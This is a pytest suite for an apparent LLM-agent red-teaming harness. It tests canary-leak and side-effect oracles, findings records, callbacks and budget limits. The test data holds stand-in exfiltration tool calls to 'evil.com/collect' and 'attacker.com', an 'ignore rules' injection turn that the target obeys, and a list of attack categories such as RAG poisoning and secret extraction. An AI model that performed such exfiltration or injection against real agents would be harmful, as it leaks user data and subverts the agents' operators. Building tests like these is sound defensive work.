import base64
import asyncio
import inspect
import json
from pathlib import Path
import pytest
from agentguard.attackers import (
    CAPABILITY_TARGETED,
    PLAYBOOKS,
    FindingsSink,
    _assistant_message_no_reasoning,
    _after_model_callback,
    _after_tool_callback,
    _before_model_callback,
    _before_tool_callback,
    _initial_state,
    _canary_oracle,
    _side_effect_oracle,
    make_attacker,
)
from agentguard.events import get_event_bus, reset_event_bus
from agentguard.schemas import AttemptStatus, ProbeOutcome, TargetProfile


def test_canary_oracle():
    canaries = ["CANARY_SECRET_123456789"]

    # Direct match
    assert _canary_oracle("The secret is CANARY_SECRET_123456789 here", canaries) == "CANARY_SECRET_123456789"

    # Prefix match (> 12 chars)
    assert _canary_oracle("Partial: CANARY_SECRET", canaries) == "CANARY_SECRET_123456789"

    # Base64 encoded match
    b64 = base64.b64encode(b"CANARY_SECRET_123456789").decode()
    assert _canary_oracle(f"Encoded: {b64}", canaries) == "CANARY_SECRET_123456789"

    # No match
    assert _canary_oracle("Nothing secret here", canaries) is None
    assert _canary_oracle("", canaries) is None


def test_side_effect_oracle():
    destructive = {"delete_file", "transfer_funds"}

    # No destructive calls
    safe_calls = [{"name": "get_balance", "args": {"account": "123"}}]
    assert _side_effect_oracle(safe_calls, destructive) is None

    # Destructive call present
    bad_calls = [
        {"name": "get_balance", "args": {"account": "123"}},
        {"name": "transfer_funds", "args": {"to": "Bob", "amount": 500}},
    ]
    hit = _side_effect_oracle(bad_calls, destructive)
    assert hit is not None
    assert hit["name"] == "transfer_funds"

    # Data exfiltration detection (external URL in argument)
    exfil_calls = [
        {"name": "send_log", "args": {"destination": "https://evil.com/collect", "data": "secret"}}
    ]
    hit_exfil = _side_effect_oracle(exfil_calls, destructive)
    assert hit_exfil is not None
    assert "external URL" in hit_exfil.get("oracle_reason", "")


def test_attack_categories_and_playbooks():
    expected_categories = [
        "prompt_injection",
        "secret_extraction",
        "tool_misuse",
        "data_exfiltration",
        "privilege_escalation",
        "rag_poisoning",
        "memory_persistence",
    ]
    for cat in expected_categories:
        assert cat in CAPABILITY_TARGETED
        assert cat in PLAYBOOKS
        assert len(PLAYBOOKS[cat]) > 50


def test_findings_sink_lifecycle(tmp_path: Path):
    sink = FindingsSink(
        target_desc={"url": "http://127.0.0.1:8000"},
        manifest_summary={"tools": ["transfer_funds"]},
    )

    sink.start_attempt("prompt_injection", "system_prompt")
    sink.record_turn("ignore rules", {"output": "I obey!", "tool_calls": []})
    assert sink.succeeded is False

    sink.mark_success("llm_judge", "Target obeyed attacker instructions")
    assert sink.succeeded is True

    # Subsequent marks should not overwrite the first proof
    sink.mark_success("canary", "another detail")
    assert sink._oracle == "llm_judge"

    sink.finish_attempt()
    assert len(sink.attempts) == 1
    assert sink.attempts[0]["success"] is True

    out_file = tmp_path / "findings.json"
    sink.to_json(out_file)

    saved = json.loads(out_file.read_text(encoding="utf-8"))
    assert saved["target"]["url"] == "http://127.0.0.1:8000"
    assert len(saved["attempts"]) == 1
    assert saved["attempts"][0]["category"] == "prompt_injection"


def test_findings_sink_scorecard_compatibility(tmp_path: Path):
    from agentguard.reporters import compute_scorecard
    from agentguard.schemas import AttemptStatus, Finding

    sink = FindingsSink(
        target_desc={"url": "http://127.0.0.1:8000"},
        manifest_summary={"tools": []},
    )
    sink.attempts.append(
        Finding(
            category="prompt_injection",
            capability_targeted="system_prompt",
            status=AttemptStatus.CONFIRMED,
        )
    )
    scorecard = compute_scorecard({"attempts": sink.attempts})
    assert scorecard["total_successes"] == 1
    assert scorecard["total_attempts"] == 1

    # Real path: serialize to JSON and load back
    out_file = tmp_path / "findings.json"
    sink.to_json(out_file)
    findings_data = json.loads(out_file.read_text(encoding="utf-8"))
    json_scorecard = compute_scorecard(findings_data)
    assert json_scorecard["total_successes"] == 1
    assert json_scorecard["total_attempts"] == 1


def test_finish_attempt_skips_judge_for_refusals(monkeypatch):
    sink = FindingsSink({}, {})
    sink.start_attempt("prompt_injection", "system_prompt")
    sink.record_turn("ignore", {"output": "no", "tool_calls": []}, ProbeOutcome.REFUSAL)
    monkeypatch.setattr("agentguard.judge.judge_attempt", lambda *args, **kwargs: pytest.fail("judge called"))
    sink.finish_attempt()
    assert sink.attempts[0].status == AttemptStatus.FAILED
    assert sink.attempts[0].confidence == 0.9


def test_finish_attempt_skips_judge_for_target_errors(monkeypatch):
    sink = FindingsSink({}, {})
    sink.start_attempt("prompt_injection", "system_prompt")
    sink.record_turn("ignore", {"output": None, "tool_calls": []}, ProbeOutcome.TARGET_ERROR)
    monkeypatch.setattr("agentguard.judge.judge_attempt", lambda *args, **kwargs: pytest.fail("judge called"))
    sink.finish_attempt()
    assert sink.attempts[0].status == AttemptStatus.ERROR


def test_assistant_message_no_reasoning():
    msg = _assistant_message_no_reasoning(
        content="Hello",
        tool_calls=[{"id": "call_1"}],
        reasoning_content="internal reasoning to be stripped",
        extra_key="keep_this_key",
    )
    assert msg["role"] == "assistant"
    assert msg["content"] == "Hello"
    assert msg["tool_calls"] == [{"id": "call_1"}]
    assert msg["extra_key"] == "keep_this_key"
    assert "reasoning_content" not in msg


def test_attacker_callbacks_emit_events(monkeypatch):
    captured = []
    reset_event_bus()
    get_event_bus().subscribe(captured.append)

    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    profile = TargetProfile(tools=["transfer_funds"], has_rag=False, has_memory=False)
    agent = make_attacker("tool_misuse", FakeTarget(), FindingsSink({}, {}), [], set(), 1, profile)
    tool = type("Tool", (), {"name": "send_probe"})()
    agent.kwargs["before_model_callback"](None, "request")
    agent.kwargs["before_tool_callback"](tool, {"text": "probe"}, None)
    agent.kwargs["after_tool_callback"](tool, {"text": "probe"}, None, {"response": "ok"})
    agent.kwargs["after_model_callback"](None, "response")
    assert [event.event_type for event in captured] == ["before_model", "before_tool", "after_tool", "after_model"]


def test_adk_callback_parameter_names():
    assert list(inspect.signature(_before_model_callback).parameters) == ["callback_context", "llm_request"]
    assert list(inspect.signature(_after_model_callback).parameters) == ["callback_context", "llm_response"]
    assert list(inspect.signature(_before_tool_callback).parameters) == ["tool", "args", "tool_context"]
    assert list(inspect.signature(_after_tool_callback).parameters) == ["tool", "args", "tool_context", "tool_response"]


def test_callback_failures_do_not_propagate(monkeypatch):
    monkeypatch.setattr("agentguard.attackers._emit_callback_event", lambda *args, **kwargs: (_ for _ in ()).throw(RuntimeError()))
    assert _before_model_callback(None, None) is None
    assert _after_model_callback(None, None) is None
    assert _before_tool_callback(None, {}, None) is None
    assert _after_tool_callback(None, {}, None, {}) is None


def test_adk_model_callbacks_emit_events():
    from google.adk.agents import LlmAgent
    from google.adk.models.base_llm import BaseLlm
    from google.adk.models.llm_response import LlmResponse
    from google.adk.runners import Runner
    from google.adk.sessions import InMemorySessionService
    from google.genai import types

    class FakeLlm(BaseLlm):
        async def generate_content_async(self, llm_request, stream=False):
            yield LlmResponse(content=types.Content(role="model", parts=[types.Part(text="done")]))

    async def run():
        reset_event_bus()
        captured = []
        get_event_bus().subscribe(captured.append)
        service = InMemorySessionService()
        agent = LlmAgent(name="fake", model=FakeLlm(model="fake"), before_model_callback=_before_model_callback, after_model_callback=_after_model_callback)
        runner = Runner(agent=agent, app_name="test", session_service=service)
        session = await service.create_session(app_name="test", user_id="user")
        message = types.Content(role="user", parts=[types.Part(text="hello")])
        async for _ in runner.run_async(user_id="user", session_id=session.id, new_message=message):
            pass
        return captured

    events = asyncio.run(run())
    assert {event.event_type for event in events} >= {"before_model", "after_model"}


def test_initial_state_contains_profile():
    profile = TargetProfile(tools=["transfer_funds"], has_rag=True, has_memory=False)
    assert _initial_state(profile) == {
        "target_profile": profile.model_dump(),
        "findings": [],
    }


def test_attacker_instruction_contains_target_profile(monkeypatch):
    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

    profile = TargetProfile(tools=["transfer_funds"], has_rag=True, has_memory=False)
    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    agent = make_attacker("tool_misuse", FakeTarget(), FindingsSink({}, {}), [], set(), 1, profile)
    assert "transfer_funds" in agent.kwargs["instruction"]
    assert "{target_profile}" in agent.kwargs["instruction"]


def test_finish_attempt_appends_finding_to_state(monkeypatch):
    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

        def invoke(self, text, session_id=None):
            return {"output": "ok", "tool_calls": []}

    profile = TargetProfile(tools=["transfer_funds"], has_rag=True, has_memory=False)
    captured = []
    reset_event_bus()
    get_event_bus().subscribe(captured.append)
    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    sink = FindingsSink({}, {})
    sink.start_attempt("tool_misuse", "destructive_tool")
    sink.mark_success("side_effect", "transfer_funds fired")
    agent = make_attacker("tool_misuse", FakeTarget(), sink, [], set(), 1, profile)
    send = next(tool for tool in agent.kwargs["tools"] if tool.__name__ == "send_probe")
    send("probe")
    context = type("Context", (), {"state": _initial_state(profile)})()
    finish = next(tool for tool in agent.kwargs["tools"] if tool.__name__ == "finish_attempt")
    finish(context)

    assert context.state["findings"] == [sink.attempts[0].model_dump(mode="json")]
    assert captured[-1].event_type == "state_update"


def test_session_state_finding_matches_sink(monkeypatch):
    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

        def invoke(self, text, session_id=None):
            return {"output": "ok", "tool_calls": []}

    profile = TargetProfile(tools=["transfer_funds"], has_rag=False, has_memory=False)
    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    sink = FindingsSink({}, {})
    sink.start_attempt("tool_misuse", "destructive_tool")
    sink.mark_success("side_effect", "transfer_funds fired")
    agent = make_attacker("tool_misuse", FakeTarget(), sink, [], set(), 1, profile)
    send = next(tool for tool in agent.kwargs["tools"] if tool.__name__ == "send_probe")
    send("probe")
    state = _initial_state(profile)
    finish = next(tool for tool in agent.kwargs["tools"] if tool.__name__ == "finish_attempt")
    finish(type("Context", (), {"state": state})())
    assert state["findings"] == [finding.model_dump(mode="json") for finding in sink.attempts]


def test_record_finding_refuses_when_no_probe(monkeypatch):
    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    profile = TargetProfile(tools=["transfer_funds"], has_rag=False, has_memory=False)
    sink = FindingsSink({}, {})
    sink.start_attempt("tool_misuse", "destructive_tool")
    agent = make_attacker("tool_misuse", FakeTarget(), sink, [], set(), 1, profile)
    record = next(tool for tool in agent.kwargs["tools"] if tool.__name__ == "record_finding")
    res = record("exploited", "high impact")
    assert "rejected" in res
    assert not sink._attacker_claimed_success


def test_finish_attempt_refuses_when_no_probe(monkeypatch):
    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    profile = TargetProfile(tools=["transfer_funds"], has_rag=False, has_memory=False)
    sink = FindingsSink({}, {})
    sink.start_attempt("tool_misuse", "destructive_tool")
    agent = make_attacker("tool_misuse", FakeTarget(), sink, [], set(), 1, profile)
    finish = next(tool for tool in agent.kwargs["tools"] if tool.__name__ == "finish_attempt")
    context = type("Context", (), {"state": _initial_state(profile)})()
    res = finish(context)
    assert "rejected" in res
    assert len(sink.attempts) == 0


def test_after_model_callback_strips_functions_prefix():
    class FakeFunctionCall:
        def __init__(self, name):
            self.name = name

    class FakePart:
        def __init__(self, name):
            self.function_call = FakeFunctionCall(name)

    class FakeContent:
        def __init__(self, name):
            self.parts = [FakePart(name)]

    class FakeResponse:
        def __init__(self, name):
            self.content = FakeContent(name)

    resp = FakeResponse("functions.finish_attempt")
    altered = _after_model_callback(None, resp)
    assert altered.content.parts[0].function_call.name == "finish_attempt"

    dict_part = type("Part", (), {"function_call": {"name": "functions.send_probe"}})()
    resp_dict = type("Resp", (), {"content": type("Content", (), {"parts": [dict_part]})()})()
    altered_dict = _after_model_callback(None, resp_dict)
    assert altered_dict.content.parts[0].function_call["name"] == "send_probe"


def test_turn_limit_filler_not_stored_as_evidence():
    sink = FindingsSink({}, {})
    sink.start_attempt("tool_misuse", "destructive_tool")
    sink.record_turn("probe", {"output": "[turn limit reached — stop probing and call record_finding]"})
    assert len(sink._turns) == 0


@pytest.mark.asyncio
async def test_category_exception_becomes_error_finding(monkeypatch):
    from agentguard.attackers import run_attack_suite
    from agentguard.manifest import Manifest, ToolInfo

    class ExplodingTarget:
        url = "http://fake"

        def new_session_id(self):
            return "session"

        def invoke(self, text, session_id=None):
            raise RuntimeError("Target crashed unexpectedly")

    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)

    async def fake_run_attacker(*args, **kwargs):
        raise RuntimeError("Runner crashed in category")

    monkeypatch.setattr("agentguard.attackers.run_attacker", fake_run_attacker)

    manifest = Manifest(tools=[ToolInfo(name="transfer_funds", destructive=True)])
    sink = await run_attack_suite(ExplodingTarget(), manifest, max_probes=1)
    assert len(sink.attempts) >= 1
    assert any(a.status == AttemptStatus.ERROR for a in sink.attempts)
    assert any("Runner crashed" in (a.oracle_detail or "") for a in sink.attempts)


# --- Category-aware oracles -------------------------------------------------

def _probe_once(monkeypatch, category, invoke_result, canaries=(), destructive=frozenset({"transfer_funds"})):
    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

        def invoke(self, text, session_id=None):
            return invoke_result

    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    captured = []
    reset_event_bus()
    get_event_bus().subscribe(captured.append)
    profile = TargetProfile(tools=["transfer_funds"], has_rag=False, has_memory=False)
    sink = FindingsSink({}, {})
    sink.start_attempt(category, CAPABILITY_TARGETED[category])
    agent = make_attacker(category, FakeTarget(), sink, list(canaries), set(destructive), 3, profile)
    send = next(tool for tool in agent.kwargs["tools"] if tool.__name__ == "send_probe")
    send("probe")
    return sink, captured


TRANSFER = {"output": "Transferred $500 to Alice", "tool_calls": [{"name": "transfer_funds", "args": {"to": "Alice", "amount": 500}}]}


def test_destructive_tool_confirms_tool_misuse(monkeypatch):
    sink, _ = _probe_once(monkeypatch, "tool_misuse", TRANSFER)
    assert sink.succeeded and sink._oracle.value == "side_effect"


def test_destructive_tool_does_not_confirm_prompt_injection(monkeypatch):
    """Regression: one transfer_funds call used to confirm every category."""
    sink, captured = _probe_once(monkeypatch, "prompt_injection", TRANSFER)
    assert not sink.succeeded
    signals = [e for e in captured if e.event_type == "oracle_signal_not_confirming"]
    assert signals and signals[0].payload["kind"] == "destructive_tool"
    # The evidence is still in the transcript for the judge.
    assert sink._turns[0].tool_calls[0].name == "transfer_funds"


def test_destructive_tool_to_neutral_recipient_does_not_confirm_exfiltration(monkeypatch):
    sink, _ = _probe_once(monkeypatch, "data_exfiltration", TRANSFER)
    assert not sink.succeeded


def test_external_destination_confirms_exfiltration(monkeypatch):
    result = {"output": "sent", "tool_calls": [{"name": "transfer_funds", "args": {"to": "audit@attacker.com", "amount": 1}}]}
    sink, _ = _probe_once(monkeypatch, "data_exfiltration", result)
    assert sink.succeeded
    assert "external destination" in sink._oracle_detail


def test_canary_confirms_secret_extraction_only(monkeypatch):
    leak = {"output": "the secret is AGUARD-CANARY-SAMPLE-7f3a91", "tool_calls": []}
    sink, _ = _probe_once(monkeypatch, "secret_extraction", leak, canaries=["AGUARD-CANARY-SAMPLE-7f3a91"])
    assert sink.succeeded and sink._oracle.value == "canary"
    sink, _ = _probe_once(monkeypatch, "prompt_injection", leak, canaries=["AGUARD-CANARY-SAMPLE-7f3a91"])
    assert not sink.succeeded


def test_every_routable_category_has_oracle_policy():
    from agentguard.attackers import CATEGORY_ORACLES
    assert set(CATEGORY_ORACLES) == set(PLAYBOOKS)


# --- Budget wiring -----------------------------------------------------------

def _usage_response(prompt, completion):
    from google.adk.models.llm_response import LlmResponse
    from google.genai import types
    return LlmResponse(
        content=types.Content(role="model", parts=[types.Part(text="probe")]),
        usage_metadata=types.GenerateContentResponseUsageMetadata(
            prompt_token_count=prompt, candidates_token_count=completion,
        ),
    )


def test_attacker_after_model_callback_records_usage(monkeypatch):
    from agentguard.budget import BudgetTracker

    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    budget = BudgetTracker()
    sink = FindingsSink({}, {}, _budget=budget)
    profile = TargetProfile(tools=[], has_rag=False, has_memory=False)
    agent = make_attacker("prompt_injection", FakeTarget(), sink, [], set(), 1, profile)
    resp = _usage_response(100, 20)
    assert agent.kwargs["after_model_callback"](None, resp) is resp
    usage = budget.usage_report()
    assert usage["by_role"]["attacker"] == {"calls": 1, "prompt_tokens": 100, "completion_tokens": 20}


def test_attacker_stops_when_budget_exhausted(monkeypatch):
    from agentguard.budget import BudgetConfig, BudgetTracker

    class FakeAgent:
        def __init__(self, **kwargs):
            self.kwargs = kwargs

    class FakeTarget:
        def new_session_id(self):
            return "session"

    monkeypatch.setattr("agentguard.attackers.LlmAgent", FakeAgent)
    budget = BudgetTracker(BudgetConfig(max_calls_total=1))
    sink = FindingsSink({}, {}, _budget=budget)
    sink.start_attempt("prompt_injection", "system_prompt")
    profile = TargetProfile(tools=[], has_rag=False, has_memory=False)
    callback = make_attacker("prompt_injection", FakeTarget(), sink, [], set(), 1, profile).kwargs["after_model_callback"]
    callback(None, _usage_response(10, 10))
    replaced = callback(None, _usage_response(10, 10))
    assert "budget exhausted" in replaced.content.parts[0].text
    assert not replaced.get_function_calls()
    assert sink.budget_exhausted

    # The judge is not consulted; an unverified attempt is ERROR, not SUSPECTED.
    sink.record_turn("probe", {"output": "some answer", "tool_calls": []}, outcome=ProbeOutcome.SUCCESS)
    monkeypatch.setattr("agentguard.judge.judge_attempt", lambda **kw: pytest.fail("judge called"))
    sink.finish_attempt()
    assert sink.attempts[-1].status == AttemptStatus.ERROR
    assert not sink.attempts[-1].success


@pytest.mark.asyncio
async def test_suite_skips_categories_after_budget_exhausted(monkeypatch):
    from agentguard.attackers import run_attack_suite
    from agentguard.budget import BudgetConfig, BudgetExceededError, BudgetTracker
    from agentguard.manifest import Manifest

    budget = BudgetTracker(BudgetConfig(max_calls_total=1))
    budget.record("attacker")
    with pytest.raises(BudgetExceededError):
        budget.record("attacker")

    async def must_not_run(*args, **kwargs):
        pytest.fail("attacker ran after budget exhaustion")

    monkeypatch.setattr("agentguard.attackers.run_attacker", must_not_run)
    from agentguard.config import get_config
    monkeypatch.setattr(get_config(), "category_cooldown_seconds", 0)
    target = type("T", (), {"url": "http://fake", "new_session_id": lambda self: "s"})()
    sink = await run_attack_suite(target, Manifest(), budget=budget)
    assert {a.category for a in sink.attempts} == {"prompt_injection", "secret_extraction"}
    assert all(a.status == AttemptStatus.ERROR and "budget" in a.oracle_detail for a in sink.attempts)
    assert len(sink.session_state["findings"]) == 2
